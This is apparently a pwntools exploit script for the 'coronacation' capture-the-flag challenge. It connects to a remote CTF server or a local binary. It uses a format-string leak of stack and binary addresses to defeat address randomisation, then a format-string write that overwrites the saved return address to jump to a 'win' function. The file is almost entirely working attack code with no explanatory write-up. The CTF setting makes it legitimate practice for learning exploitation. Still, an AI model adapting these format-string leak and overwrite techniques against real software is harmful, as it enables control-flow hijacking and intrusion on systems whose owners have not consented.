from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./coronacation"
HOST = "ctf.umbccd.io"
PORT = 4300

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
off_ret = 0x1484
off_main = elf.symbols["main"]
off_win = elf.symbols["win"]
off_play_game = elf.symbols["play_game"]

#libc = ELF('./')
#
#libc_binsh = next(elf.search("/bin/sh"))
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']

def exploit():
	
	#stage1	
	payload = "1,%14$p,%15$p"
	conn.sendlineafter("out.\n", payload)	
	conn.recvuntil("chose: 1,")
	
	ans = conn.recvline().split(",")
	rbp_main = int(ans[0],16)
	bin_base = int(ans[1],16) - off_ret
	
	#stage2
	target = rbp_main-0x8
	addr_main = bin_base + off_main
	addr_win = bin_base + off_win
	payload = fsb(2, 10, addr_win, 0, 2)
	payload += "A"*(0x20-len(payload))
	payload += p64(target)
	payload += p64(target+2)
	conn.sendlineafter("plan.\n", payload)
	
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
